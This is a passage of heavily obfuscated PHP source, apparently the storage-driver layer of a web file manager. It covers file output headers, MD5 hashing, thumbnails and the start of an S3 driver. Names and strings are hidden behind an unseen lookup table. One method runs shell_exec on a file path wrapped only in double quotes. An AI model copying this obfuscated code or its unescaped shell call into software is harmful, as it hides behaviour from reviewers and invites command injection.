$—º—áÎ[8]); if ($•›£ßÍ¥ === !1) { return $ÓºÜãÜÓ; } return substr($ÓºÜãÜÓ, $•›£ßÍ¥ + 1); } public function pathFather($ööİºÛ¢) { $»Á¶÷ÊÓ =& $_SERVER[°‰†òö¯]; $ööİºÛ¢ = str_replace($»Á¶÷ÊÓ[100], $»Á¶÷ÊÓ[8], rtrim($ööİºÛ¢, $»Á¶÷ÊÓ[8])); $Ì®ÒãÁ÷ = strrpos($ööİºÛ¢, $»Á¶÷ÊÓ[8]); if ($Ì®ÒãÁ÷ === !1) { return $»Á¶÷ÊÓ[12]; } return substr($ööİºÛ¢, 0, $Ì®ÒãÁ÷ + 1); } public function hashSimple($ÕÔ¬’ÏÈ) { $§èã˜¦ô =& $_SERVER[°‰†òö¯]; if (!$ÕÔ¬’ÏÈ) { return md5($§èã˜¦ô[12]); } $İ¬Åûúú = $this->size($ÕÔ¬’ÏÈ); $¼ÖŠÓ½— = 200; $ ²ªÌõ¢ = 50; if ($İ¬Åûúú <= $¼ÖŠÓ½— * $ ²ªÌõ¢) { return $this->hashMd5($ÕÔ¬’ÏÈ) . $İ¬Åûúú; } $Æù÷ãÂ = intval($İ¬Åûúú / $ ²ªÌõ¢); $¼ù¹‘º« = $§èã˜¦ô[12]; for ($¹–”Ï¾ = 0; $¹–”Ï¾ < $ ²ªÌõ¢; $¹–”Ï¾++) { $¼ù¹‘º« .= $this->fileSubstr($ÕÔ¬’ÏÈ, $Æù÷ãÂ * $¹–”Ï¾, $¼ÖŠÓ½—); } $¼ù¹‘º« .= $this->fileSubstr($ÕÔ¬’ÏÈ, $İ¬Åûúú - $¼ÖŠÓ½—, $¼ÖŠÓ½—); return md5($¼ù¹‘º«) . $İ¬Åûúú; } public static $md5Cache = array(); public function hashMd5($ÌüÓîŠ) { if (!$ÌüÓîŠ) { return md5($_SERVER[°‰†òö¯][12]); } $ÌüÓîŠ = $this->iconvSystem($ÌüÓîŠ); if (isset(self::$md5Cache[$ÌüÓîŠ])) { return self::$md5Cache[$ÌüÓîŠ]; } self::$md5Cache[$ÌüÓîŠ] = $this->hashMd5Shell($ÌüÓîŠ); if (!self::$md5Cache[$ÌüÓîŠ]) { self::$md5Cache[$ÌüÓîŠ] = @md5_file($ÌüÓîŠ); } return self::$md5Cache[$ÌüÓîŠ]; } private function hashMd5Shell($ÜÊÍÍ·×) { $­âĞŠˆÇ =& $_SERVER[°‰†òö¯]; if (!$ÜÊÍÍ·×) { return md5($­âĞŠˆÇ[12]); } if (!function_exists($­âĞŠˆÇ[101])) { return !1; } $Ù•¿¥ê = array($­âĞŠˆÇ[102], $­âĞŠˆÇ[103]); $ÍªÚÑãä = Cache::get($­âĞŠˆÇ[104]); if (!$ÍªÚÑãä) { $ÏÆù¹›ü = BASIC_PATH . $­âĞŠˆÇ[105]; $×ÄÊÛï¼ = md5_file($ÏÆù¹›ü); $ÍªÚÑãä = $­âĞŠˆÇ[106]; foreach ($Ù•¿¥ê as $·®¨íØ) { $®Ü„„Î = shell_exec($·®¨íØ . "\40\x22{$ÏÆù¹›ü}\x22"); if ($®Ü„„Î && substr(trim($®Ü„„Î), 0, 32) == $×ÄÊÛï¼) { $ÍªÚÑãä = $·®¨íØ; break; } } Cache::set($­âĞŠˆÇ[104], $ÍªÚÑãä, 3600); } if ($ÍªÚÑãä == $­âĞŠˆÇ[106]) { return !1; } $®Ü„„Î = shell_exec($ÍªÚÑãä . "\40\42{$ÜÊÍÍ·×}\42"); $®Ü„„Î = str_replace($­âĞŠˆÇ[107], $­âĞŠˆÇ[12], $®Ü„„Î); return substr($®Ü„„Î, 0, 32); } public function link($¾¤—ú) { return $¾¤—ú; } public function fileOut($°ÄæŠÂµ, $ÏÛÛÒ¦á = false, $“Ì«ğ„ = false, $æè†Â§¤ = '') { $©‚ûøş =& $_SERVER[°‰†òö¯]; $this->cacheMethod(null, null); if (!$°ÄæŠÂµ || !$this->exist($°ÄæŠÂµ)) { show_json(LNG($©‚ûøş[108]), !1, $“Ì«ğ„); } $óŸºçÖ¥ = $this->getType() == $©‚ûøş[109]; $½úÂï¿Ä = $GLOBALS[$©‚ûøş[6]][$©‚ûøş[92]][$©‚ûøş[110]][$©‚ûøş[111]]; $ÖÈª‰à› = (double) $GLOBALS[$©‚ûøş[6]][$©‚ûøş[92]][$©‚ûøş[110]][$©‚ûøş[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¶›ÌœõÚ = $this->infoFull($°ÄæŠÂµ); $Âáõü…“ = $¶›ÌœõÚ[$©‚ûøş[79]]; $íÀÚÃğœ = gmdate($©‚ûøş[113], $¶›ÌœõÚ[$©‚ûøş[88]]); $×ÅÀï = $“Ì«ğ„ ? $“Ì«ğ„ : $this->iconvApp($¶›ÌœõÚ[$©‚ûøş[32]]); $ôä÷ú¬” = 0; $ÙŠÖ­¦­ = $Âáõü…“ - 1; $İèßÁ‰Ú = $this->ext($×ÅÀï); if (in_array($İèßÁ‰Ú, array($©‚ûøş[114], $©‚ûøş[115], $©‚ûøş[116], $©‚ûøş[117]))) { $İèßÁ‰Ú = $©‚ûøş[118]; } if (in_array($İèßÁ‰Ú, array($©‚ûøş[119]))) { $İèßÁ‰Ú = $©‚ûøş[120]; } if (!$æè†Â§¤) { $æè†Â§¤ = md5($íÀÚÃğœ . $Âáõü…“); } $æè†Â§¤ = $©‚ûøş[121] . $æè†Â§¤ . $©‚ûøş[121]; $Òê¶åÊ = get_file_mime($İèßÁ‰Ú); $æó‚ ĞÄ = !0; $æó‚ ĞÄ = isset($_GET[$©‚ûøş[122]]) ? !1 : !0; if ($ÏÛÛÒ¦á === !1 && !mime_support($Òê¶åÊ)) { $Òê¶åÊ = $©‚ûøş[123]; } header($©‚ûøş[124]); header($©‚ûøş[125] . $Òê¶åÊ); $İ ŞÕ›“ = rawurlencode($×ÅÀï); $İ ŞÕ›“ = $©‚ûøş[121] . $İ ŞÕ›“ . $©‚ûøş[126] . $İ ŞÕ›“; if ($ÏÛÛÒ¦á) { header($©‚ûøş[127]); header($©‚ûøş[128] . $İ ŞÕ›“); } else { if ($æó‚ ĞÄ) { header($©‚ûøş[129] . $İ ŞÕ›“); } } $ç“¸°†ö = 3600 * 24 * 30; header($©‚ûøş[130]); header($©‚ûøş[131]); header($©‚ûøş[132] . $ç“¸°†ö); header($©‚ûøş[133] . gmdate($©‚ûøş[113], time() + $ç“¸°†ö) . $©‚ûøş[134]); if (isset($_SERVER[$©‚ûøş[135]]) && strtotime($_SERVER[$©‚ûøş[135]]) == $¶›ÌœõÚ[$©‚ûøş[88]]) { header($©‚ûøş[136], !0, 304); die; } if (isset($_SERVER[$©‚ûøş[137]]) && $_SERVER[$©‚ûøş[137]] == $æè†Â§¤) { header($©‚ûøş[138] . $æè†Â§¤, !0, 304); die; } header($©‚ûøş[138] . $æè†Â§¤); header($©‚ûøş[139] . $íÀÚÃğœ . $©‚ûøş[134]); header($©‚ûøş[140] . $×ÅÀï); header($©‚ûøş[141]); header($©‚ûøş[142] . $Âáõü…“); header($©‚ûøş[143]); Hook::trigger($©‚ûøş[144], $°ÄæŠÂµ, $Âáõü…“, $×ÅÀï, $İèßÁ‰Ú); if (!$ÏÛÛÒ¦á && $İèßÁ‰Ú == $©‚ûøş[145]) { if ($Âáõü…“ > 1024 * 1024 * 5) { die; } $áÌ¢Îï® = $this->getContent($°ÄæŠÂµ); $áÌ¢Îï® = Html::clearSVG($áÌ¢Îï®); header($©‚ûøş[146] . strlen($áÌ¢Îï®)); echo $áÌ¢Îï®; die; } $¤½æûíá = strtolower($_SERVER[$©‚ûøş[147]]); if ($óŸºçÖ¥ && $¤½æûíá && $½úÂï¿Ä) { if (strstr($¤½æûíá, $©‚ûøş[148])) { header($©‚ûøş[149] . $°ÄæŠÂµ); } else { if (strstr($¤½æûíá, $©‚ûøş[150])) { header($©‚ûøş[151] . $°ÄæŠÂµ); } else { if (strstr($¤½æûíá, $©‚ûøş[152])) { header($©‚ûøş[153] . $°ÄæŠÂµ); } } } if ($ÖÈª‰à›) { header($©‚ûøş[154] . $ÖÈª‰à›); } return; } if (isset($_SERVER[$©‚ûøş[155]])) { if (preg_match($©‚ûøş[156], $_SERVER[$©‚ûøş[155]], $õÄºé½Ñ)) { $ôä÷ú¬” = intval($õÄºé½Ñ[1]); $ôä÷ú¬” = $ôä÷ú¬” <= 0 ? 0 : ($ôä÷ú¬” >= $ÙŠÖ­¦­ ? $ÙŠÖ­¦­ : $ôä÷ú¬”); if (!empty($õÄºé½Ñ[2])) { $í½—ÕÚ½ = intval($õÄºé½Ñ[2]); $ÙŠÖ­¦­ = $í½—ÕÚ½ < $ôä÷ú¬” ? $ôä÷ú¬” : ($í½—ÕÚ½ >= $ÙŠÖ­¦­ ? $ÙŠÖ­¦­ : $í½—ÕÚ½); } } header($©‚ûøş[157]); header("\103\157\156\x74\145\156\x74\x2d\x52\x61\x6e\x67\145\72\40\x62\171\x74\x65\163\x20{$ôä÷ú¬”}\x2d{$ÙŠÖ­¦­}\57" . $Âáõü…“); } else { header($©‚ûøş[158]); } header($©‚ûøş[159]); header($©‚ûøş[160]); $çæÏ’Ë = !0; if ($_SERVER[$©‚ûøş[161]] == $©‚ûøş[162] && $Âáõü…“ > 1204 * 1024 * 1024 * 2) { $çæÏ’Ë = !1; } if ($çæÏ’Ë) { header($©‚ûøş[163] . ($ÙŠÖ­¦­ - $ôä÷ú¬” + 1)); } if ($_SERVER[$©‚ûøş[164]] == $©‚ûøş[165]) { return; } $Ä’Ó„°• = array($©‚ûøş[166] => !1, $©‚ûøş[167] => $ôä÷ú¬”, $©‚ûøş[168] => $ÙŠÖ­¦­, $©‚ûøş[169] => $İèßÁ‰Ú, $©‚ûøş[170] => $¶›ÌœõÚ, $©‚ûøş[171] => $©‚ûøş[12], $©‚ûøş[172] => 0); $Ä’Ó„°• = Hook::filter($©‚ûøş[173], $Ä’Ó„°•); $“ùÃ¢Êè = 1024 * 300; $¤£ªÜ¼Ë = 0; if ($ÖÈª‰à›) { $¤£ªÜ¼Ë = intval(1000 * 1000 * ($“ùÃ¢Êè / $ÖÈª‰à›)); } while ($ôä÷ú¬” <= $ÙŠÖ­¦­) { $ü¤­¾³ü = timeFloat(); check_abort(); $Ä€±Ô“† = $ÙŠÖ­¦­ - $ôä÷ú¬” + 1; if ($Ä€±Ô“† <= $“ùÃ¢Êè) { $“ùÃ¢Êè = $Ä€±Ô“†; } $áÌ¢Îï® = $this->fileSubstr($°ÄæŠÂµ, $ôä÷ú¬”, $“ùÃ¢Êè); if ($Ä’Ó„°•[$©‚ûøş[166]]) { $Ä’Ó„°•[$©‚ûøş[171]] = $áÌ¢Îï®; $Ä’Ó„°•[$©‚ûøş[172]] = $ôä÷ú¬”; $Ä’Ó„°• = Hook::filter($©‚ûøş[174], $Ä’Ó„°•); $áÌ¢Îï® = $Ä’Ó„°•[$©‚ûøş[171]]; } echo $áÌ¢Îï®; $ôä÷ú¬” += $“ùÃ¢Êè; if ($“ùÃ¢Êè == $Ä€±Ô“†) { $ôä÷ú¬” = $ÙŠÖ­¦­ + 1; } if ($¤£ªÜ¼Ë) { $¯¯´ÜçÒ = intval(1000 * 1000 * (timeFloat() - $ü¤­¾³ü)); $‘’Öô¡ƒ = $¤£ªÜ¼Ë - $¯¯´ÜçÒ; if ($‘’Öô¡ƒ > 5) { usleep($‘’Öô¡ƒ); } } } } public function fileOutServer($«•ÉÛƒ„, $ÂÏÜ»•“ = false, $éë‹ÓÛ = false, $ù€Ô™çÉ = '') { $this->fileOut($«•ÉÛƒ„, $ÂÏÜ»•“, $éë‹ÓÛ, $ù€Ô™çÉ); } public function fileOutLink($åµ‹¡‘«) { header($_SERVER[°‰†òö¯][175] . $åµ‹¡‘«); die; } public function cacheMethod($şüÛ×¨, $¥òÙü, $‰ÎÌ×©§ = null) { $¸›ˆíä =& $_SERVER[°‰†òö¯]; static $¦‡ÈÄ‰ = array(); $×¼ûÅ¾ = $¥òÙü ? ltrim($this->getPathOuter($¥òÙü), $¸›ˆíä[8]) : $¸›ˆíä[12]; $²Ê†ø¨« = $¸›ˆíä[176] . $şüÛ×¨ . $¸›ˆíä[177] . rtrim($×¼ûÅ¾, $¸›ˆíä[8]); if (is_null($şüÛ×¨)) { $¦‡ÈÄ‰ = array(); return; } if (is_null($¥òÙü)) { foreach ($¦‡ÈÄ‰ as $²Ê†ø¨« => $´ªÂÊ) { if (!strstr($²Ê†ø¨«, $¸›ˆíä[176] . $şüÛ×¨ . $¸›ˆíä[178])) { continue; } unset($¦‡ÈÄ‰[$²Ê†ø¨«]); } return; } if (!is_null($‰ÎÌ×©§)) { $¦‡ÈÄ‰[$²Ê†ø¨«] = $‰ÎÌ×©§; return; } $Şà¹ç¬ = isset($¦‡ÈÄ‰[$²Ê†ø¨«]) ? $¦‡ÈÄ‰[$²Ê†ø¨«] : null; if (!is_null($Şà¹ç¬)) { return $Şà¹ç¬; } $Şà¹ç¬ = $this->{$şüÛ×¨}($¥òÙü); $¦‡ÈÄ‰[$²Ê†ø¨«] = $Şà¹ç¬; return $Şà¹ç¬; } public function cacheMethodInfoSet($ÕÖì¤¨Â, $ú„ó³ª, $ùÅº–¨ = false) { $¶×À—Œ˜ =& $_SERVER[°‰†òö¯]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¶×À—Œ˜[179], $ÕÖì¤¨Â, $ú„ó³ª); $this->cacheMethod($¶×À—Œ˜[180], $ÕÖì¤¨Â, $ú„ó³ª ? !1 : !0); if (is_array($ùÅº–¨)) { $this->cacheMethod($¶×À—Œ˜[181], $ÕÖì¤¨Â, $ùÅº–¨); } } public function fileOutImage($×ŠßÒ•Ä, $¬½•°¿ô = 250) { $½âÊÙÀ™ =& $_SERVER[°‰†òö¯]; set_timeout(); if (substr($×ŠßÒ•Ä, 0, 4) == $½âÊÙÀ™[152]) { $this->fileOutLink($×ŠßÒ•Ä); } $Ÿ›İöæş = $this->info($×ŠßÒ•Ä); $èÔ£Ï¿ò = !1; $´´ê­à = isset($GLOBALS[$½âÊÙÀ™[182]]) ? $GLOBALS[$½âÊÙÀ™[182]] : array(); if ($´´ê­à && $´´ê­à[$½âÊÙÀ™[183]] == $Ÿ›İöæş[$½âÊÙÀ™[87]]) { $Ÿ›İöæş = $´´ê­à; $Ş¦Ëù»Å = $Ÿ›İöæş[$½âÊÙÀ™[184]]; if ($Ş¦Ëù»Å && isset($Ş¦Ëù»Å[$½âÊÙÀ™[185]])) { if ($Ş¦Ëù»Å[$½âÊÙÀ™[185]] <= $¬½•°¿ô && $Ş¦Ëù»Å[$½âÊÙÀ™[186]] <= $¬½•°¿ô) { $èÔ£Ï¿ò = !0; } } } if ($Ÿ›İöæş[$½âÊÙÀ™[79]] <= 1024 * 50 || $èÔ£Ï¿ò || !function_exists($½âÊÙÀ™[187]) || $Ÿ›İöæş[$½âÊÙÀ™[169]] == $½âÊÙÀ™[188]) { return $this->fileOut($×ŠßÒ•Ä, !1, $Ÿ›İöæş[$½âÊÙÀ™[32]]); } $©ÓíãÛ = kodIO::hashPath($Ÿ›İöæş); $øßÉÂ»­ = "\x63\157\166\x65\x72\x5f{$©ÓíãÛ}\137{$¬½•°¿ô}\x2e\x70\156\x67"; $ĞìÔ›«ö = IO_PATH_SYSTEM_TEMP . $½âÊÙÀ™[189]; $³÷âÍ€¼ = IO::infoFullSimple($ĞìÔ›«ö); $¤¬¤õ† = $³÷âÍ€¼ && is_array($³÷âÍ€¼) ? $³÷âÍ€¼[$½âÊÙÀ™[87]] : $½âÊÙÀ™[12]; if (!$¤¬¤õ†) { $¤¬¤õ† = IO::mkdir($ĞìÔ›«ö); } if ($Ÿ›İöæş[$½âÊÙÀ™[190]] == $½âÊÙÀ™[191] && isset($Ÿ›İöæş[$½âÊÙÀ™[192]]) && $Ÿ›İöæş[$½âÊÙÀ™[192]] == kodIO::sourceID($¤¬¤õ†)) { $¡ù¤ã¥ = $Ÿ›İöæş[$½âÊÙÀ™[193]]; if ($¬½•°¿ô <= 500) { $èâ—ÂĞ = preg_replace($½âÊÙÀ™[194], $½âÊÙÀ™[195], $Ÿ›İöæş[$½âÊÙÀ™[32]]); $¡ù¤ã¥ = IO::fileNameExist($¤¬¤õ†, $èâ—ÂĞ); } return IO::fileOut(KodIO::make($¡ù¤ã¥), !1, $Ÿ›İöæş[$½âÊÙÀ™[32]]); } $ô´Äø = IO::fileNameExist($¤¬¤õ†, $øßÉÂ»­); if ($ô´Äø) { return IO::fileOut(KodIO::make($ô´Äø), !1, $Ÿ›İöæş[$½âÊÙÀ™[32]]); } if ($¬½•°¿ô > 1000) { $this->makeImageCover($¤¬¤õ†, $×ŠßÒ•Ä, $øßÉÂ»­, $¬½•°¿ô); $this->makeImageCover($¤¬¤õ†, $×ŠßÒ•Ä, "\x63\157\166\x65\162\x5f{$©ÓíãÛ}\137\x32\x35\x30\x2e\x70\156\147", 250); $ô´Äø = IO::fileNameExist($¤¬¤õ†, $øßÉÂ»­); if ($ô´Äø) { return IO::fileOut(KodIO::make($ô´Äø), !1, $Ÿ›İöæş[$½âÊÙÀ™[32]]); } die; } if (!kodIO::allowCover($Ÿ›İöæş)) { return $this->fileOut($×ŠßÒ•Ä, !1, $Ÿ›İöæş[$½âÊÙÀ™[32]]); } $•ÍšÏèã = Cache::get($øßÉÂ»­); if ($•ÍšÏèã == $½âÊÙÀ™[196] || $•ÍšÏèã == $½âÊÙÀ™[197]) { echo $•ÍšÏèã; die; } Cache::set($øßÉÂ»­, $½âÊÙÀ™[197], 60); $å¼Ò‡ÑÎ = array($¤¬¤õ†, $Ÿ›İöæş[$½âÊÙÀ™[87]], $øßÉÂ»­, $¬½•°¿ô); $®ÇôÓá§ = $½âÊÙÀ™[198] . $Ÿ›İöæş[$½âÊÙÀ™[79]] . $½âÊÙÀ™[199] . $øßÉÂ»­ . $½âÊÙÀ™[200] . $Ÿ›İöæş[$½âÊÙÀ™[32]] . $½âÊÙÀ™[201] . $Ÿ›İöæş[$½âÊÙÀ™[87]]; TaskQueue::add($½âÊÙÀ™[202], $å¼Ò‡ÑÎ, $®ÇôÓá§, $øßÉÂ»­); } public function makeImageCover($ÍÉ å´Û, $ñ¯”âŠ¦, $ı‡çã£, $ÜÑ¿­ìÆ) { $›ê‹İŞÕ =& $_SERVER[°‰†òö¯]; if (IO::fileNameExist($ÍÉ å´Û, $ı‡çã£)) { return $›ê‹İŞÕ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¨óÌš¹š = $this->getPathOuter($ñ¯”âŠ¦); $ŒÈ¦ƒáò = DATA_THUMB . $ı‡çã£; del_file($ŒÈ¦ƒáò); $ùŸô¾À¯ = IO::copy($¨óÌš¹š, TEMP_FILES, !1, $ı‡çã£); if (!@file_exists($ùŸô¾À¯)) { return $›ê‹İŞÕ[204]; } ImageThumb::createThumb($ùŸô¾À¯, $ŒÈ¦ƒáò, $ÜÑ¿­ìÆ, $ÜÑ¿­ìÆ * 10); if (@file_exists($ŒÈ¦ƒáò)) { Cache::remove($ı‡çã£); return IO::move($ŒÈ¦ƒáò, $ÍÉ å´Û); } Cache::set($ı‡çã£, $›ê‹İŞÕ[196], 600); del_file($ŒÈ¦ƒáò); return $›ê‹İŞÕ[205] . $ùŸô¾À¯ . $›ê‹İŞÕ[74]; } public function fileOutImageServer($şÓ‹‘€, $ÊÚ¥ÒÙÁ = 250) { $this->fileOutImage($şÓ‹‘€, $ÊÚ¥ÒÙÁ); } public function fileNameAuto($”êÖ°‹, $÷ƒıÃá­, $ú¥ëı×ù = REPEAT_RENAME, $ãÑ¦ÓÉ = false) { $ƒ‘øçó® =& $_SERVER[°‰†òö¯]; $îñÍŞµ = $”êÖ°‹ === $ƒ‘øçó®[12] ? $÷ƒıÃá­ : rtrim($”êÖ°‹, $ƒ‘øçó®[8]) . $ƒ‘øçó®[8] . $÷ƒıÃá­; if ($ú¥ëı×ù == REPEAT_REPLACE || !$this->exist($îñÍŞµ) || $ãÑ¦ÓÉ && $ú¥ëı×ù != REPEAT_RENAME_FOLDER) { return $÷ƒıÃá­; } if ($ú¥ëı×ù == REPEAT_SKIP) { return !1; } $ÏÌàØï„ = $ƒ‘øçó®[10] . get_path_ext($÷ƒıÃá­); $ÏÌàØï„ = $ÏÌàØï„ == $ƒ‘øçó®[10] || $ãÑ¦ÓÉ ? $ƒ‘øçó®[12] : $ÏÌàØï„; $ç’ØŸù = 1; $…Éù´–Ú = substr($÷ƒıÃá­, 0, strlen($÷ƒıÃá­) - strlen($ÏÌàØï„)); $Âò°·”î = $…Éù´–Ú . "\50{$ç’ØŸù}\x29{$ÏÌàØï„}"; while ($this->exist(rtrim($”êÖ°‹, $ƒ‘øçó®[8]) . $ƒ‘øçó®[8] . $Âò°·”î)) { $Âò°·”î = $…Éù´–Ú . "\x28{$ç’ØŸù}\51{$ÏÌàØï„}"; $ç’ØŸù++; } return $Âò°·”î; } private function fileNameAutoList($Ü©à†Ì¬, $·‹ÆØ±¾, $¾÷¹«Ö° = false) { $šñË¿Õß =& $_SERVER[°‰†òö¯]; $ÁÇøÀ² = $this->listPath($Ü©à†Ì¬, !0); $ÁÇøÀ² = array_merge($ÁÇøÀ²[$šñË¿Õß[85]], $ÁÇøÀ²[$šñË¿Õß[86]]); $ÔÙ»í¦ = array_to_keyvalue($ÁÇøÀ², $šñË¿Õß[12], $šñË¿Õß[32]); $ù˜“Õì‘ = $šñË¿Õß[10] . get_path_ext($·‹ÆØ±¾); $ù˜“Õì‘ = $ù˜“Õì‘ == $šñË¿Õß[10] || $¾÷¹«Ö° ? $šñË¿Õß[12] : $ù˜“Õì‘; $ÍÍƒŠÌ‚ = substr($·‹ÆØ±¾, 0, strlen($·‹ÆØ±¾) - strlen($ù˜“Õì‘)); $²ı¹‹Ë¦ = $ÍÍƒŠÌ‚ . "\x28\60\51{$ù˜“Õì‘}"; for ($¡¢¨¡îÇ = 1; $¡¢¨¡îÇ <= count($ÔÙ»í¦) + 1; $¡¢¨¡îÇ++) { $²ı¹‹Ë¦ = $ÍÍƒŠÌ‚ . "\x28{$¡¢¨¡îÇ}\51{$ù˜“Õì‘}"; if (!in_array_not_case($²ı¹‹Ë¦, $ÔÙ»í¦)) { return $²ı¹‹Ë¦; } } return $²ı¹‹Ë¦; } public function listAllFiles($¿¯É¢üÛ, $øüú³¡Ù) { $É—¸‡¡ =& $_SERVER[°‰†òö¯]; if (empty($øüú³¡Ù)) { return array(); } $èïÍÃ˜† = array_keys($øüú³¡Ù); $ˆº˜Ë‹ã = array(); $¿¯É¢üÛ = trim($¿¯É¢üÛ, $É—¸‡¡[8]); foreach ($øüú³¡Ù as $ ÑíÁÁ‰ => $ƒ•‘ĞÒŞ) { $ÓŠ¡¢“ = ltrim(substr(trim($ ÑíÁÁ‰, $É—¸‡¡[8]), strlen($¿¯É¢üÛ)), $É—¸‡¡[8]); if (substr($ ÑíÁÁ‰, -1) == $É—¸‡¡[8]) { $ÓŠ¡¢“ = rtrim($ÓŠ¡¢“, $É—¸‡¡[8]) . $É—¸‡¡[8]; } $ˆº˜Ë‹ã = array_merge($ˆº˜Ë‹ã, $this->slicePath($ÓŠ¡¢“)); } $”«¦‘·æ = array(); foreach (array_unique($ˆº˜Ë‹ã) as $±‹øÂ¥) { $˜îŞÖ’ = array($É—¸‡¡[87] => $this->getPathOuter($É—¸‡¡[8] . $¿¯É¢üÛ . $É—¸‡¡[8] . $±‹øÂ¥), $É—¸‡¡[78] => 1, $É—¸‡¡[79] => 0); if (substr($±‹øÂ¥, -1) != $É—¸‡¡[8]) { $˜îŞÖ’[$É—¸‡¡[78]] = 0; $˜÷ø¶± = $this->getPath($¿¯É¢üÛ . $É—¸‡¡[8] . $±‹øÂ¥); if (isset($øüú³¡Ù[$˜÷ø¶±])) { $ü®œˆŒù = $øüú³¡Ù[$˜÷ø¶±]; if (isset($ü®œˆŒù[$É—¸‡¡[79]])) { $˜îŞÖ’[$É—¸‡¡[79]] = intval($ü®œˆŒù[$É—¸‡¡[79]]); } if (isset($ü®œˆŒù[$É—¸‡¡[206]])) { $˜îŞÖ’[$É—¸‡¡[88]] = intval($ü®œˆŒù[$É—¸‡¡[206]]); } } } $”«¦‘·æ[] = $˜îŞÖ’; } return $”«¦‘·æ; } public function slicePath($©¶é¸Ó—) { $İ£ĞØ•” =& $_SERVER[°‰†òö¯]; $ªÖ¼¹¦ü = explode($İ£ĞØ•”[8], trim($©¶é¸Ó—, $İ£ĞØ•”[8])); $‘‡±’÷™ = 0; do { ++$‘‡±’÷™; $‘ª¸¤¯‘[] = implode($İ£ĞØ•”[8], array_slice($ªÖ¼¹¦ü, 0, $‘‡±’÷™)) . $İ£ĞØ•”[8]; } while ($‘‡±’÷™ < count($ªÖ¼¹¦ü)); $‘ª¸¤¯‘[count($ªÖ¼¹¦ü) - 1] = $©¶é¸Ó—; return $‘ª¸¤¯‘; } public function getHost() { $•ãíµà™ =& $_SERVER[°‰†òö¯]; $«‚¸‡§… = parse_url(trim($this->domain, $•ãíµà™[8])); $€üÈñ½ç = isset($«‚¸‡§…[$•ãíµà™[207]]) ? $«‚¸‡§…[$•ãíµà™[207]] : http_type(); $¿ß—ß¾æ = isset($«‚¸‡§…[$•ãíµà™[208]]) ? $«‚¸‡§…[$•ãíµà™[208]] : $«‚¸‡§…[$•ãíµà™[87]]; if (isset($«‚¸‡§…[$•ãíµà™[209]])) { $¿ß—ß¾æ .= $•ãíµà™[4] . $«‚¸‡§…[$•ãíµà™[209]]; } return $€üÈñ½ç . $•ãíµà™[210] . $¿ß—ß¾æ; } public function pathEncode($—ë…°‡“) { $Üİ½ùÆÉ =& $_SERVER[°‰†òö¯]; return str_replace($Üİ½ùÆÉ[211], $Üİ½ùÆÉ[8], rawurlencode($—ë…°‡“)); } public function writeLog($¤Û™¶‡© = '', $„ô»¶´ = false) { $ß„»Âé =& $_SERVER[°‰†òö¯]; $ôú‰œäÕ = in_array(ACTION, array($ß„»Âé[212], $ß„»Âé[213])); if (!$ôú‰œäÕ && !GLOBAL_DEBUG) { return; } $À˜ĞÊƒ¢ = $¤Û™¶‡©; static $îßû´š = null; if (!$îßû´š) { $îßû´š = strtoupper($this->getType()); } $¤Û™¶‡© = $îßû´š . $ß„»Âé[214] . $¤Û™¶‡©; if ($„ô»¶´) { $ÑÅ¸¹² = error_get_last(); if ($ÑÅ¸¹²) { $¤Û™¶‡© = array($¤Û™¶‡©, $ÑÅ¸¹²); } } write_log($¤Û™¶‡©, $ß„»Âé[215]); if ($ôú‰œäÕ) { throw new Exception($À˜ĞÊƒ¢); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($üê”Ï¸Î) { set_timeout(); require_once SDK_DIR . $_SERVER[°‰†òö¯][216]; parent::__construct(); $this->_init($üê”Ï¸Î); } public function _init($˜¥Ÿ­Œû) { $ÃÖñ”Ä =& $_SERVER[°‰†òö¯]; $this->config = $˜¥Ÿ­Œû; foreach ($˜¥Ÿ­Œû as $àáâÏÑô => $Ï°ôô…·) { if (isset($this->{$àáâÏÑô})) { $this->{$àáâÏÑô} = $Ï°ôô…·; } } $this->endpoint = $˜¥Ÿ­Œû[$ÃÖñ”Ä[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Õ¸Õä“Ş = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Õ¸Õä“Ş, 0, 7) == $ÃÖñ”Ä[218]) { $Õ¸Õä“Ş = $ÃÖñ”Ä[219] . substr($Õ¸Õä“Ş, 7); } $this->client->setEndpoint($Õ¸Õä“Ş); if (in_array(ACTION, array($ÃÖñ”Ä[212], $ÃÖñ”Ä[213]))) { $this->client->setExceptions(); } } public function setSignVersion($ˆ´»Áå = "\x76\64") { $this->signVer = $ˆ´»Áå; $this->client->setSignVersion($ˆ´»Áå); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $éÉçË‘) { return null; } } public function isBucketCors() { $´§òÍÄ… =& $_SERVER[°‰†òö¯]; $ä°ĞŸù¢ = $this->getBucketCors(); if (!$ä°ĞŸù¢ || !is_array($ä°ĞŸù¢)) { return !1; } if (!is_array($ä°ĞŸù¢[$´§òÍÄ…[220]])) { $ä°ĞŸù¢[$´§òÍÄ…[220]] = explode($´§òÍÄ…[50], $ä°ĞŸù¢[$´§òÍÄ…[220]]); } if ($ä°ĞŸù¢[$´§òÍÄ…[221]] != $´§òÍÄ…[222] || !in_array($´§òÍÄ…[222], $ä°ĞŸù¢[$´§òÍÄ…[220]])) { return !1; } $Òö›˜æî = array_map($´§òÍÄ…[223], $ä°ĞŸù¢[$´§òÍÄ…[224]]); if (!is_array($Òö›˜æî)) { $Òö›˜æî = array(); } $ùÉííîä = array($´§òÍÄ…[225], $´§òÍÄ…[226], $´§òÍÄ…[227], $´§òÍÄ…[228], $´§òÍÄ…[229]); $ªš¼Š” = array_diff($ùÉííîä, $Òö›˜æî); return empty($ªš¼Š”); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($âÌÎ€¶Æ, $´‰„±—Ë = '', $×¢™—ø‘ = REPEAT_RENAME) { $ï´¿ûºŒ = $this->setContent($âÌÎ€¶Æ, $´‰„±—Ë); if ($ï´¿ûºŒ !== !1) { return $this->getPathOuter($âÌÎ€¶Æ); } return !1; } 